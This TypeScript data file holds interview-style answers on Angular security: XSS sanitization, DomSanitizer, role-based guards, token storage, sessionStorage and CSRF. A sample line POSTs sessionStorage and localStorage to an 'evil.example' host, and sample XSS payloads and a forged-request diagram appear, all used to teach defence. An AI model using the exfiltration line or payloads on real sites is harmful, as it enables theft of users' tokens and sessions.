import type { AnswerMap } from './answer.model';

export const answers: AnswerMap = {
  'How are you securing your Angular application?': {
    summary:
      'Security is layered: Angular gives XSS protection out of the box (template sanitization, no `eval`-style templates with AOT), and on top of that I add secure authentication (HttpOnly cookies or short-lived tokens via an interceptor), route guards for UX, CSRF protection, a Content Security Policy, HTTPS, dependency auditing — and, crucially, the backend enforces every authorization rule because anything in the browser can be bypassed.',
    details: [
      {
        type: 'paragraph',
        text: 'A good answer separates what Angular does for you, what you configure in the app, and what must live on the server. The frontend can only make attacks harder and the UX safer; the real security boundary is the API.',
      },
      { type: 'heading3', text: "1. XSS — Angular's built-in sanitization" },
      {
        type: 'code',
        lang: 'typescript',
        code: `@Component({
  template: \`
    <!-- Interpolation is always escaped: <script> shows as text -->
    <p>{{ comment }}</p>

    <!-- [innerHTML] is sanitized: <script> and onerror= are stripped (with a dev-mode warning) -->
    <div [innerHTML]="comment"></div>
  \`,
})
export class CommentComponent {
  comment = '<img src=x onerror="alert(1)"> hello';
}

// ⚠️ Bypassing is explicit and should be rare + reviewed
const trusted = this.sanitizer.bypassSecurityTrustHtml(serverHtmlFromTrustedCms);`,
      },
      {
        type: 'bullets',
        items: [
          'Never build templates from user input or touch the DOM directly with `ElementRef.nativeElement.innerHTML = …`; use bindings or `Renderer2`.',
          'Avoid `bypassSecurityTrust*` unless the content is from a trusted source — and sanitize on the server too (e.g. DOMPurify for rich text).',
          'Enable **Trusted Types** and a strict **CSP** (Angular supports both; the CLI can add a nonce with `autoCsp` / `ngCspNonce`).',
        ],
      },
      { type: 'heading3', text: '2. Authentication & tokens' },
      {
        type: 'code',
        lang: 'typescript',
        code: `// Functional interceptor attaches the token only to our own API
export const authInterceptor: HttpInterceptorFn = (req, next) => {
  const auth = inject(AuthService);
  const token = auth.accessToken();               // kept in memory (signal), not localStorage
  if (!token || !req.url.startsWith(environment.apiUrl)) return next(req);
  return next(req.clone({ setHeaders: { Authorization: \`Bearer \${token}\` } })).pipe(
    catchError((err: HttpErrorResponse) => {
      if (err.status === 401) auth.logout();      // or try a silent refresh
      return throwError(() => err);
    }),
  );
};`,
      },
      {
        type: 'paragraph',
        text: "Prefer OAuth2/OIDC with Authorization Code + PKCE (via a library like `angular-oauth2-oidc` or the provider's SDK), or a BFF (backend-for-frontend) that keeps tokens server-side and gives the browser an `HttpOnly; Secure; SameSite` session cookie.",
      },
      { type: 'heading3', text: '3. Authorization in the UI (guards) — UX, not security' },
      {
        type: 'code',
        lang: 'typescript',
        code: `export const adminGuard: CanActivateFn = () => {
  const auth = inject(AuthService);
  return auth.hasRole('admin') || inject(Router).createUrlTree(['/forbidden']);
};
// The API MUST still check the role — anyone can edit JS in DevTools.`,
      },
      { type: 'heading3', text: '4. Other layers' },
      {
        type: 'bullets',
        items: [
          "**CSRF**: if you use cookies, Angular's `HttpClient` reads an `XSRF-TOKEN` cookie and sends `X-XSRF-TOKEN` (`withXsrfConfiguration()`); combine with `SameSite` cookies.",
          '**HTTPS everywhere** + security headers (HSTS, `X-Content-Type-Options`, `frame-ancestors` in CSP to stop clickjacking).',
          '**No secrets in the bundle**: `environment.ts` is public — API keys there are visible to anyone.',
          '**Dependencies**: `npm audit`, Dependabot/Renovate, keep Angular up to date (security fixes land in supported versions).',
          '**Validate input** on the client for UX and on the server for security; avoid leaking stack traces in error messages.',
          "Disable source maps in production or don't serve them publicly, and remove sensitive `console.log`s.",
        ],
      },
      {
        type: 'flow',
        title: 'Defense in depth for an Angular app',
        code: `flowchart LR
  U["User input"]:::client --> S["Angular sanitization<br/>+ CSP / Trusted Types"]:::security
  S --> G["Route guards<br/>(UX only)"]:::client
  G --> I["Auth interceptor<br/>token / XSRF header"]:::network
  I --> API["API: authN + authZ<br/>+ input validation"]:::server
  API --> DB[("Data")]:::db`,
      },
      {
        type: 'callout',
        variant: 'tip',
        text: 'Interview tip: say explicitly "the frontend is not a security boundary — guards and hidden buttons are UX; the API enforces permissions." Interviewers often probe for exactly this.',
      },
    ],
  },

  'How to implement role-based access control in Angular?': {
    summary:
      "Load the user's roles/permissions after login (from the ID token claims or a `/me` endpoint) into an auth service, then use them in three places: functional route guards (`canActivate`, `canMatch`) to block navigation, a structural directive or `@if` to show/hide UI, and an interceptor to handle 401/403. The backend must enforce the same rules — Angular RBAC is only for user experience.",
    details: [
      {
        type: 'paragraph',
        text: 'RBAC means access is decided by roles (admin, editor, viewer) or, more flexibly, by permissions attached to roles (`orders:delete`). Checking permissions instead of role names keeps the UI stable when the business adds new roles.',
      },
      { type: 'heading3', text: 'Auth service holding the current user' },
      {
        type: 'code',
        lang: 'typescript',
        code: `export type Role = 'admin' | 'editor' | 'viewer';
interface CurrentUser { id: string; roles: Role[]; permissions: string[] }

@Injectable({ providedIn: 'root' })
export class AuthService {
  private http = inject(HttpClient);
  readonly user = signal<CurrentUser | null>(null);
  readonly isLoggedIn = computed(() => this.user() !== null);

  loadUser() {
    return this.http.get<CurrentUser>('/api/me').pipe(tap((u) => this.user.set(u)));
  }
  hasRole(...roles: Role[]) {
    return roles.some((r) => this.user()?.roles.includes(r));
  }
  can(permission: string) {
    return this.user()?.permissions.includes(permission) ?? false;
  }
}`,
      },
      { type: 'heading3', text: 'Functional guard driven by route data' },
      {
        type: 'code',
        lang: 'typescript',
        code: `export const roleGuard: CanActivateFn & CanMatchFn = (route) => {
  const auth = inject(AuthService);
  const router = inject(Router);
  const allowed = (route.data?.['roles'] ?? []) as Role[];

  if (!auth.isLoggedIn()) return router.createUrlTree(['/login']);
  return auth.hasRole(...allowed) || router.createUrlTree(['/forbidden']);
};

// app.routes.ts
export const routes: Routes = [
  {
    path: 'admin',
    canMatch: [roleGuard],                // lazy chunk isn't even downloaded for non-admins
    data: { roles: ['admin'] },
    loadChildren: () => import('./admin/admin.routes'),
  },
  { path: 'reports', canActivate: [roleGuard], data: { roles: ['admin', 'editor'] }, component: ReportsComponent },
];`,
      },
      { type: 'heading3', text: 'Show/hide UI with a structural directive' },
      {
        type: 'code',
        lang: 'typescript',
        code: `@Directive({ selector: '[appHasPermission]' })
export class HasPermissionDirective {
  private tpl = inject(TemplateRef<unknown>);
  private vcr = inject(ViewContainerRef);
  private auth = inject(AuthService);
  readonly appHasPermission = input.required<string>();

  constructor() {
    effect(() => {
      this.vcr.clear();
      if (this.auth.can(this.appHasPermission())) this.vcr.createEmbeddedView(this.tpl);
    });
  }
}

// usage
// <button *appHasPermission="'orders:delete'" (click)="delete()">Delete</button>
// or simply: @if (auth.can('orders:delete')) { <button>Delete</button> }`,
      },
      {
        type: 'flow',
        title: 'RBAC request flow',
        code: `sequenceDiagram
  participant U as User
  participant R as Router + roleGuard
  participant A as AuthService
  participant API as Backend API
  U->>R: navigate to /admin
  R->>A: hasRole('admin')?
  A-->>R: false
  R-->>U: redirect /forbidden
  U->>API: crafted DELETE /orders/7
  API-->>U: 403 Forbidden (server enforces RBAC)`,
      },
      {
        type: 'bullets',
        items: [
          'Make sure roles are loaded before guards run — e.g. load `/me` in `provideAppInitializer()` or make the guard return an Observable that waits for the user.',
          "Use `canMatch` for lazy routes so unauthorized users don't download the feature bundle; `canActivateChild` to protect a whole subtree.",
          'Legacy equivalent: class-based guards implementing `CanActivate` and `*ngIf` — still seen in older codebases.',
          "Handle 403 from the API in an interceptor (toast + redirect) because the UI's view of permissions can be stale.",
        ],
      },
      {
        type: 'callout',
        variant: 'warning',
        text: "Pitfall: reading roles from a JWT stored in localStorage and trusting them on the client is fine for UX, but never for security — the token's payload is readable and the JS can be patched. Every protected API endpoint must re-check the role.",
      },
    ],
  },

  'Where do you store authentication tokens? Session Storage vs Local Storage, and can tokens be stored in a service using RxJS Observables?':
    {
      summary:
        'Most secure: let the server set the token (or a session id) in an `HttpOnly; Secure; SameSite` cookie, ideally through a BFF. If the SPA must handle tokens, keep the short-lived access token in memory — yes, in a singleton service using a `BehaviorSubject` or signal — and the refresh token in an HttpOnly cookie. Between the two Web Storage options, sessionStorage is less exposed (per tab, cleared on close) than localStorage (persistent, shared), but both are readable by XSS.',
      details: [
        {
          type: 'paragraph',
          text: 'There is no perfect place — each option trades XSS exposure, CSRF exposure and UX (does the user stay logged in after refresh or across tabs?). Interviewers want to see that you know the trade-offs and the common hybrid pattern.',
        },
        { type: 'heading3', text: 'Comparison' },
        {
          type: 'bullets',
          items: [
            '**localStorage**: survives restarts and is shared across tabs (good UX), but readable by any script → highest XSS impact; a stolen long-lived token works until it expires.',
            '**sessionStorage**: per tab, cleared on close → smaller window, but still XSS-readable; user must log in again in each new tab.',
            "**In-memory (service)**: not persisted anywhere, so it's gone on refresh — XSS can still use it while the page is running, but cannot easily harvest it later; needs a silent refresh on reload.",
            '**HttpOnly cookie**: invisible to JS (immune to token theft via XSS), sent automatically → needs CSRF protection (`SameSite`, XSRF token). Works best when API and app share a site or via a BFF.',
          ],
        },
        { type: 'heading3', text: 'Yes — an in-memory token service with RxJS' },
        {
          type: 'code',
          lang: 'typescript',
          code: `@Injectable({ providedIn: 'root' })        // singleton → one token for the whole app
export class TokenService {
  private http = inject(HttpClient);
  private readonly token$ = new BehaviorSubject<string | null>(null);

  readonly accessToken$ = this.token$.asObservable();          // read-only for consumers
  readonly isLoggedIn$ = this.token$.pipe(map(Boolean), distinctUntilChanged());

  get snapshot() { return this.token$.value; }                 // sync read for interceptors

  login(creds: Credentials) {
    // Server returns the access token in the body and sets the refresh token as an HttpOnly cookie
    return this.http.post<{ accessToken: string }>('/auth/login', creds, { withCredentials: true })
      .pipe(tap(({ accessToken }) => this.token$.next(accessToken)));
  }

  refresh() {   // called on app start (page reload) and on 401
    return this.http.post<{ accessToken: string }>('/auth/refresh', {}, { withCredentials: true })
      .pipe(tap(({ accessToken }) => this.token$.next(accessToken)));
  }

  logout() { this.token$.next(null); }
}`,
        },
        {
          type: 'code',
          lang: 'typescript',
          code: `// Interceptor reads the in-memory token
export const tokenInterceptor: HttpInterceptorFn = (req, next) => {
  const token = inject(TokenService).snapshot;
  return next(token ? req.clone({ setHeaders: { Authorization: \`Bearer \${token}\` } }) : req);
};

// Modern alternative to BehaviorSubject: a signal
// readonly accessToken = signal<string | null>(null);`,
        },
        {
          type: 'flow',
          title: 'Hybrid pattern: memory + HttpOnly refresh cookie',
          code: `sequenceDiagram
  participant SPA as Angular (TokenService)
  participant API as Auth API
  SPA->>API: POST /auth/login
  API-->>SPA: accessToken (body) + Set-Cookie refresh (HttpOnly)
  Note over SPA: token kept in BehaviorSubject (memory)
  SPA->>API: GET /orders + Bearer token
  Note over SPA: page reload → memory cleared
  SPA->>API: POST /auth/refresh (cookie sent automatically)
  API-->>SPA: new accessToken`,
        },
        {
          type: 'bullets',
          items: [
            'Keep access tokens short-lived (minutes) and rotate refresh tokens.',
            "Use `provideAppInitializer()` to call `refresh()` on startup so a reload doesn't log the user out.",
            "For cross-tab logout, broadcast with `BroadcastChannel` (memory isn't shared across tabs).",
            'An Observable/signal in a service is about **state sharing and reactivity**, not about encryption — it is "secure" only in the sense that it isn\'t persisted to disk or readable from storage.',
          ],
        },
        { type: 'divider' },
        {
          type: 'heading3',
          text: 'Follow-up: Is it secure or recommended to store sensitive or personal data (`PII/tokens`) in browser Session Storage?',
        },
        {
          type: 'paragraph',
          text: "No, not for anything that would be harmful if stolen. Session storage is readable by any JavaScript running on the origin, so a single XSS bug (or a compromised third-party script) can exfiltrate it; it is also unencrypted on disk and visible in DevTools. It's slightly better than localStorage only because it disappears when the tab closes. Prefer `HttpOnly; Secure; SameSite` cookies or a BFF for tokens, keep access tokens in memory if you must handle them in JS, and avoid storing PII client-side at all.",
        },
        { type: 'heading3', text: 'How an XSS steals it' },
        {
          type: 'code',
          lang: 'javascript',
          code: `// One injected line is enough — no user interaction needed
fetch('https://evil.example/collect', {
  method: 'POST',
  body: JSON.stringify({ ...sessionStorage, ...localStorage }),
});
// An HttpOnly cookie would NOT be readable here: document.cookie hides it.`,
        },
        { type: 'heading3', text: 'Risks summarised' },
        {
          type: 'bullets',
          items: [
            '**XSS / supply-chain scripts** can read and send it anywhere.',
            '**No encryption at rest** — stored in the browser profile on disk; shared or compromised machines expose it.',
            '**Visible in DevTools**, screen-sharing, browser extensions with page access.',
            '**Compliance**: storing PII (emails, addresses, health data, national IDs) client-side widens your GDPR/HIPAA/PCI scope; card data must never be stored.',
            "Client-side encryption doesn't really help — the key has to live in the same JS that an attacker controls.",
          ],
        },
        { type: 'heading3', text: 'What to do instead' },
        {
          type: 'bullets',
          items: [
            '**Tokens**: refresh token in an `HttpOnly; Secure; SameSite=Strict/Lax` cookie; short-lived access token kept **in memory** (a service/signal) and refreshed silently. Or a **BFF** so the browser only ever holds a session cookie.',
            "**PII**: fetch it when needed and keep it in memory; don't cache it in Web Storage.",
            '**Acceptable in sessionStorage**: non-sensitive UI state — wizard step, filters, a post-login redirect URL, a feature-flag override.',
            'Reduce XSS risk regardless: Angular sanitization, strict CSP, Trusted Types, few third-party scripts.',
          ],
        },
        {
          type: 'flow',
          title: 'Where should this data live?',
          code: `flowchart TD
  Q{"Harmful if stolen?<br/>(token, PII, payment)"} -->|No| UI["sessionStorage / localStorage<br/>(UI state, preferences)"]:::cache
  Q -->|Yes| T{"Needs to be read by JS?"}
  T -->|No| C["HttpOnly Secure SameSite cookie<br/>or server session via BFF"]:::security
  T -->|Yes, briefly| M["In-memory only<br/>(service / signal), short TTL"]:::highlight`,
        },
        {
          type: 'callout',
          variant: 'tip',
          text: 'Interview tip: a strong answer is "access token in memory via a `BehaviorSubject`/signal in a root service, refresh token in an HttpOnly cookie, silent refresh on reload — or a BFF if we control the backend; I\'d avoid localStorage for tokens." Then explain why in one sentence each.',
        },
        { type: 'divider' },
        { type: 'heading3', text: 'Follow-up: What is browser Session Storage?' },
        {
          type: 'paragraph',
          text: "`sessionStorage` is a Web Storage API key-value store (strings only, typically ~5 MB per origin) that is scoped to a single browser tab and origin: data survives page reloads in that tab but is cleared when the tab or window is closed, and it is not shared with other tabs. It's synchronous and accessible to any JavaScript on the page.",
        },
        {
          type: 'paragraph',
          text: 'Session storage is part of the Web Storage API alongside `localStorage`. The difference is lifetime and scope: localStorage persists until cleared and is shared across all tabs of the same origin; sessionStorage lives only for the "page session" of one tab.',
        },
        { type: 'heading3', text: 'API' },
        {
          type: 'code',
          lang: 'typescript',
          code: `sessionStorage.setItem('wizardStep', '2');
sessionStorage.getItem('wizardStep');   // '2'  (string | null)
sessionStorage.removeItem('wizardStep');
sessionStorage.clear();                 // remove everything for this origin+tab
sessionStorage.length;                  // number of keys
sessionStorage.key(0);                  // name of the first key`,
        },
        { type: 'heading3', text: 'Lifetime rules' },
        {
          type: 'bullets',
          items: [
            '✅ Survives reload and back/forward navigation in the same tab.',
            '❌ Cleared when the tab/window is closed.',
            '❌ Not shared between tabs — opening the same URL in a new tab starts with empty storage.',
            'Duplicating a tab (or some "open in new tab" flows via `window.open`) **copies** the current sessionStorage into the new tab; after that they are independent.',
            'Scoped per **origin** (protocol + host + port): `http://app.com` and `https://app.com` are separate.',
            'Some browsers restore session storage when you reopen a closed tab or restore a session.',
          ],
        },
        { type: 'heading3', text: 'Comparison with other storage' },
        {
          type: 'bullets',
          items: [
            '**sessionStorage**: per tab, ~5 MB, strings, sync, JS-readable.',
            '**localStorage**: per origin across tabs, persists forever, ~5–10 MB, strings, sync, JS-readable; fires a `storage` event in other tabs.',
            '**Cookies**: ~4 KB, sent with every HTTP request, can be `HttpOnly` (not JS-readable), have expiry.',
            '**IndexedDB**: large, async, stores structured objects/blobs — for offline data.',
          ],
        },
        { type: 'heading3', text: 'Angular-friendly usage (SSR-safe)' },
        {
          type: 'code',
          lang: 'typescript',
          code: `@Injectable({ providedIn: 'root' })
export class SessionStore {
  private isBrowser = isPlatformBrowser(inject(PLATFORM_ID));

  get(key: string): string | null {
    return this.isBrowser ? sessionStorage.getItem(key) : null; // no sessionStorage on the server
  }
  set(key: string, value: string) {
    if (this.isBrowser) sessionStorage.setItem(key, value);
  }
}`,
        },
        { type: 'divider' },
        {
          type: 'heading3',
          text: 'Follow-up: What types of data (`strings vs objects`) can you store in browser Session Storage?',
        },
        {
          type: 'paragraph',
          text: 'Only strings — both keys and values. Any other value is converted with `String()`, so an object becomes `"[object Object]"` and a number becomes `"42"`. To store objects or arrays you serialize with `JSON.stringify()` and parse back with `JSON.parse()`, keeping in mind that Dates, Maps, Sets, functions, class instances and `undefined` don\'t survive JSON round-tripping.',
        },
        { type: 'heading3', text: 'The coercion trap' },
        {
          type: 'code',
          lang: 'typescript',
          code: `sessionStorage.setItem('user', { id: 1 } as any);
sessionStorage.getItem('user');        // "[object Object]"  ❌ data lost

sessionStorage.setItem('count', 42 as any);
sessionStorage.getItem('count');       // "42" — a string, not a number
sessionStorage.getItem('count') + 1;   // "421" 😬

sessionStorage.setItem('flag', false as any);
if (sessionStorage.getItem('flag')) {} // "false" is truthy → branch runs!`,
        },
        { type: 'heading3', text: 'Storing objects correctly with JSON' },
        {
          type: 'code',
          lang: 'typescript',
          code: `const cart = { items: [{ sku: 'A1', qty: 2 }], updatedAt: new Date() };
sessionStorage.setItem('cart', JSON.stringify(cart));

const raw = sessionStorage.getItem('cart');
const restored = raw ? JSON.parse(raw) : null;
restored.items[0].qty;        // 2 ✅
restored.updatedAt;           // "2026-11-05T10:00:00.000Z" — a STRING, not a Date`,
        },
        { type: 'heading3', text: 'A typed, safe wrapper' },
        {
          type: 'code',
          lang: 'typescript',
          code: `export function readJson<T>(key: string, fallback: T): T {
  try {
    const raw = sessionStorage.getItem(key);
    return raw === null ? fallback : (JSON.parse(raw) as T);
  } catch {
    return fallback;               // corrupted / manually edited value
  }
}

export function writeJson(key: string, value: unknown): void {
  try {
    sessionStorage.setItem(key, JSON.stringify(value));
  } catch (e) {
    // QuotaExceededError (~5 MB limit) or storage disabled (some private modes)
    console.warn('Could not persist', key, e);
  }
}`,
        },
        { type: 'heading3', text: 'What does not survive JSON' },
        {
          type: 'bullets',
          items: [
            '`Date` → ISO string (revive it manually or with a `JSON.parse` reviver).',
            '`Map`/`Set` → `{}` — convert to arrays first: `[...map]`.',
            'Functions, `undefined` and `Symbol` properties are dropped; class instances lose their prototype/methods.',
            '`NaN`/`Infinity` → `null`; `BigInt` throws; circular references throw.',
            'Binary data (files, blobs) — use IndexedDB instead of base64-encoding into storage.',
          ],
        },
        {
          type: 'callout',
          variant: 'warning',
          text: 'Pitfall: always treat stored data as untrusted input — users can edit it in DevTools. Validate the parsed shape (and wrap `JSON.parse` in try/catch) before using it.',
        },
        {
          type: 'callout',
          variant: 'tip',
          text: 'Good use cases: multi-step form progress, a per-tab filter state, a "return to this URL after login" value. Mention that it is synchronous (blocks the main thread on big writes) and unavailable during SSR.',
        },
      ],
    },

  'What is XSS (Cross-Site Scripting) and how does Angular protect against it by default?': {
    summary:
      'XSS is when an attacker gets their own JavaScript to run on your origin — usually by smuggling HTML like `<img onerror=...>` into data the app renders — so it can act as the user, read tokens in storage and call your API. Angular treats every value bound into the DOM as untrusted: interpolation is written as text, and property bindings to dangerous sinks (`[innerHTML]`, `[href]`, `[src]`, iframe `src`) go through a sanitizer for that security context. Templates themselves are trusted code, so the holes are the places where you step around Angular: `bypassSecurityTrust*`, direct DOM APIs, and templates built from user input.',
    details: [
      {
        type: 'paragraph',
        text: 'The three classic flavours: **stored** XSS (a malicious product review saved in the DB and shown to every visitor), **reflected** XSS (payload in a URL parameter echoed back by the server) and **DOM-based** XSS (client code copies `location.hash` or an API value into `innerHTML`). In an SPA the last two mostly collapse into "untrusted data reaches a dangerous DOM sink".',
      },
      {
        type: 'flow',
        title: 'Stored XSS path — and where Angular cuts it',
        code: `flowchart LR
  A["Attacker posts a review:<br/>img onerror=steal()"]:::external --> API["API stores it as-is"]:::server
  API --> DB[("reviews table")]:::db
  DB --> V["Victim loads product page"]:::client
  V --> B{"How is it rendered?"}
  B -->|"{{ review }} or [innerHTML]"| S["Escaped / sanitized<br/>(script + onerror removed)"]:::security
  B -->|"bypassSecurityTrustHtml<br/>or nativeElement.innerHTML"| X["Script runs on your origin:<br/>reads storage, calls API as victim"]:::highlight`,
      },
      { type: 'heading3', text: 'What Angular does for you' },
      {
        type: 'code',
        lang: 'typescript',
        code: `@Component({
  selector: 'app-review',
  template: \`
    <!-- 1. Interpolation → set as a text node; markup is shown literally -->
    <p>{{ review().author }}</p>

    <!-- 2. HTML context → sanitized: <script>, on* handlers, javascript: URLs stripped -->
    <div [innerHTML]="review().bodyHtml"></div>

    <!-- 3. URL context → "javascript:alert(1)" becomes "unsafe:javascript:alert(1)" -->
    <a [href]="review().website">Website</a>

    <!-- 4. RESOURCE_URL context (iframe src, embed src, link href…) → throws
         unless the value was explicitly trusted; it can load executable code -->
    <!-- <iframe [src]="review().videoUrl"></iframe>  ❌ runtime error -->
  \`,
})
export class ReviewComponent {
  review = input.required<Review>();
}`,
      },
      {
        type: 'bullets',
        items: [
          'Security contexts (`SecurityContext` in `@angular/core`): `NONE`, `HTML`, `STYLE`, `SCRIPT`, `URL`, `RESOURCE_URL`, plus `ATTRIBUTE_NO_BINDING` for attributes such as iframe `sandbox`/`allow` that cannot be bound at all. The compiler knows which element/property pairs map to which context.',
          'In current Angular the `STYLE` context passes values through unchanged — modern browsers no longer execute script from CSS — so style bindings are not an XSS sink, but they can still be abused for UI redressing if you bind user-controlled CSS.',
          'Sanitization strips dangerous parts rather than refusing the whole value, and logs a warning in dev mode — watch the console for "sanitizing HTML stripped some content".',
          'With AOT (the default) templates are compiled at build time, so there is no runtime template compiler for an attacker to feed.',
        ],
      },
      { type: 'heading3', text: 'Where you lose that protection' },
      {
        type: 'code',
        lang: 'typescript',
        code: `// ❌ Raw DOM sink — Angular never sees this value
this.host.nativeElement.innerHTML = comment.body;

// ❌ Building a template (or a dynamic component) from user input
const tpl = \`<div>\${userInput}</div>\`;   // templates are trusted code — never do this

// ❌ Telling Angular "trust me" for data you don't control
this.safe = this.sanitizer.bypassSecurityTrustHtml(comment.body);

// ❌ Third-party widgets / jQuery plugins writing HTML outside Angular's bindings`,
      },
      {
        type: 'bullets',
        items: [
          'Prefer bindings (or `Renderer2.setProperty`) over `ElementRef` DOM writes.',
          'Sanitize rich text on the **server** as well (e.g. an allow-list sanitizer on save), so mobile apps and emails rendering the same data are safe.',
          'Back it up with a CSP and Trusted Types so a missed bug does not automatically become code execution — see the CSP and Trusted Types questions.',
          'SSR does not change the rules: values are escaped/sanitized the same way when rendered on the server.',
        ],
      },
      {
        type: 'callout',
        variant: 'tip',
        text: 'Interview tip: say "Angular treats values as untrusted and templates as trusted" — then list the three escape hatches (bypassSecurityTrust*, direct DOM access, user-built templates). That one sentence shows you know both the default and the failure modes.',
      },
    ],
  },

  'What does `DomSanitizer` do, and when should you use `bypassSecurityTrustHtml`?': {
    summary:
      "`DomSanitizer` (from `@angular/platform-browser`) is the service Angular uses behind the scenes to clean values for a given `SecurityContext`. You can call `sanitize(context, value)` yourself, or wrap a value with one of the `bypassSecurityTrust*` methods (`Html`, `Style`, `Script`, `Url`, `ResourceUrl`) to mark it as already safe so Angular skips sanitization. Use `bypassSecurityTrustHtml` only for HTML you control or have sanitized with a stricter allow-list, never for raw user input — it disables Angular's XSS protection for that value.",
    details: [
      {
        type: 'paragraph',
        text: 'Most apps never inject `DomSanitizer` directly: binding to `[innerHTML]` already sanitizes. You reach for it in two situations — you need a sanitized string outside a template binding, or Angular is stripping something you legitimately need (an embedded video iframe, inline SVG with styles, CMS markup with classes Angular removes).',
      },
      { type: 'heading3', text: 'The API' },
      {
        type: 'code',
        lang: 'typescript',
        code: `import { DomSanitizer, SafeHtml, SafeResourceUrl } from '@angular/platform-browser';
import { SecurityContext } from '@angular/core';

const sanitizer = inject(DomSanitizer);

// Sanitize explicitly → plain string, dangerous parts removed
sanitizer.sanitize(SecurityContext.HTML, '<b>ok</b><img src=x onerror=alert(1)>');
// → '<b>ok</b><img src="x">'

// Bypass → a wrapper object Angular will NOT sanitize when bound
sanitizer.bypassSecurityTrustHtml(html);          // SafeHtml        → [innerHTML]
sanitizer.bypassSecurityTrustUrl(url);            // SafeUrl         → [href], img [src]
sanitizer.bypassSecurityTrustResourceUrl(url);    // SafeResourceUrl → iframe [src]
sanitizer.bypassSecurityTrustStyle(css);          // SafeStyle
sanitizer.bypassSecurityTrustScript(js);          // SafeScript`,
      },
      { type: 'heading3', text: 'Legitimate use: an allow-listed video embed' },
      {
        type: 'code',
        lang: 'typescript',
        code: `@Component({
  selector: 'app-product-video',
  template: \`@if (embedUrl(); as url) { <iframe [src]="url" allowfullscreen></iframe> }\`,
})
export class ProductVideoComponent {
  private sanitizer = inject(DomSanitizer);
  videoId = input.required<string>();             // e.g. from the product CMS

  embedUrl = computed<SafeResourceUrl | null>(() => {
    const id = this.videoId();
    if (!/^[A-Za-z0-9_-]{11}$/.test(id)) return null; // validate BEFORE trusting
    // We build the URL ourselves — the user only controls a validated id
    return this.sanitizer.bypassSecurityTrustResourceUrl(\`https://www.youtube-nocookie.com/embed/\${id}\`);
  });
}`,
      },
      { type: 'heading3', text: 'bypassSecurityTrustHtml for CMS content — do it safely' },
      {
        type: 'code',
        lang: 'typescript',
        code: `import DOMPurify from 'dompurify';

@Pipe({ name: 'trustedCmsHtml' })
export class TrustedCmsHtmlPipe implements PipeTransform {
  private sanitizer = inject(DomSanitizer);
  transform(html: string): SafeHtml {
    // Our own allow-list (keeps classes/data-attrs Angular would strip, still removes scripts)
    const clean = DOMPurify.sanitize(html, { ADD_ATTR: ['target'], FORBID_TAGS: ['style'] });
    return this.sanitizer.bypassSecurityTrustHtml(clean);
  }
}
// <article [innerHTML]="page.body | trustedCmsHtml"></article>`,
      },
      {
        type: 'bullets',
        items: [
          '**OK to bypass**: constants in your code, URLs you assemble from validated parts, HTML from a trusted pipeline that has been sanitized with a stricter policy.',
          '**Never bypass**: user comments, profile bios, query parameters, anything from a third-party API — even "admins only" content (admin accounts get phished).',
          'Keep bypass calls in one small, reviewed place (a pipe or service) so they are easy to audit and grep for; many teams add a lint rule.',
          'Bypassed values are typed wrappers (`SafeHtml`, …) — passing a `SafeUrl` into an HTML context throws, which prevents accidental reuse in the wrong context.',
          'With Trusted Types enforced, bypassed values go through a separate policy, so they can be restricted or audited at the CSP level.',
        ],
      },
      {
        type: 'callout',
        variant: 'tip',
        text: 'Interview tip: name the method precisely ("`bypassSecurityTrustHtml` marks the value trusted, it does not sanitize it") — many candidates think it cleans the HTML. Then show you validate or sanitize first and keep the bypass in one audited pipe.',
      },
    ],
  },

  'What is CSRF/XSRF and how does Angular `HttpClient` help prevent it?': {
    summary:
      "CSRF (cross-site request forgery) tricks a logged-in user's browser into sending a state-changing request — say a money transfer — to your site from an attacker's page; it works because the browser attaches your session cookie automatically. Angular's `HttpClient` implements the double-submit-token pattern: the server sets a readable `XSRF-TOKEN` cookie, and Angular copies it into an `X-XSRF-TOKEN` header on mutating requests (not GET/HEAD) to your own origin; the server rejects requests where header and token don't match. It only works if the server issues and validates the token — `SameSite` cookies are the second layer.",
    details: [
      {
        type: 'paragraph',
        text: 'CSRF is only a risk when authentication is **ambient** — a cookie the browser sends on its own. If your SPA sends a bearer token from memory in an `Authorization` header, a foreign site cannot attach it, so classic CSRF does not apply (but XSS does — see the token storage question).',
      },
      {
        type: 'flow',
        title: 'Forged transfer vs. XSRF token check',
        code: `sequenceDiagram
  participant E as evil.example page
  participant B as Victim browser
  participant API as bank.example API
  E->>B: auto-submitting form POST /transfer
  B->>API: POST /transfer + session cookie (no X-XSRF-TOKEN)
  API-->>B: 403 — header missing or mismatched
  Note over B,API: Legit flow from the Angular app
  B->>API: GET /api/me
  API-->>B: Set-Cookie XSRF-TOKEN=r4nd0m (not HttpOnly)
  B->>API: POST /transfer + cookie + X-XSRF-TOKEN: r4nd0m
  API-->>B: 200 — header matches token`,
        text: "The attacker's page can make the browser send cookies, but it cannot read your cookie to copy it into a header — the Same-Origin Policy blocks that.",
      },
      { type: 'heading3', text: 'Configuring it in a standalone app' },
      {
        type: 'code',
        lang: 'typescript',
        code: `// app.config.ts — XSRF protection is ON by default with provideHttpClient()
export const appConfig: ApplicationConfig = {
  providers: [
    provideHttpClient(
      withInterceptors([authInterceptor]),
      // only needed if your backend uses different names (e.g. Spring, Django)
      withXsrfConfiguration({ cookieName: 'CSRF-TOKEN', headerName: 'X-CSRF-TOKEN' }),
    ),
  ],
};

// Opt out entirely (e.g. pure bearer-token API) — incompatible with withXsrfConfiguration
// provideHttpClient(withNoXsrfProtection())`,
      },
      {
        type: 'bullets',
        items: [
          'Defaults: cookie `XSRF-TOKEN`, header `X-XSRF-TOKEN`; the token is read from `document.cookie` by the injectable `HttpXsrfTokenExtractor`.',
          'The built-in interceptor skips `GET` and `HEAD` and any request whose origin differs from the page origin — so the token is not leaked to third-party APIs. If your API is on another origin (`api.bank.example`), Angular will **not** add the header; write your own interceptor using `HttpXsrfTokenExtractor` or serve the API from the same origin via a reverse proxy.',
          'The token cookie must be readable by JS (not `HttpOnly`) — it is the session cookie that should be HttpOnly.',
          'Keep GET requests free of side effects; they are not protected.',
        ],
      },
      { type: 'heading3', text: 'Server side (what actually enforces it)' },
      {
        type: 'bullets',
        items: [
          'Generate an unpredictable token per session, set it in the `XSRF-TOKEN` cookie, and compare it with the header on every POST/PUT/PATCH/DELETE (frameworks: Spring Security `CookieCsrfTokenRepository`, `csrf-csrf` for Express, Django `CSRF_COOKIE_NAME`).',
          'Mark the session cookie `SameSite=Lax` or `Strict` as a second layer — cross-site POSTs then arrive without it.',
          'Optionally verify the `Origin` / `Sec-Fetch-Site` headers.',
          'Any XSS defeats CSRF tokens (the script runs on your origin and can read the cookie) — CSRF defences assume XSS is handled.',
        ],
      },
      {
        type: 'callout',
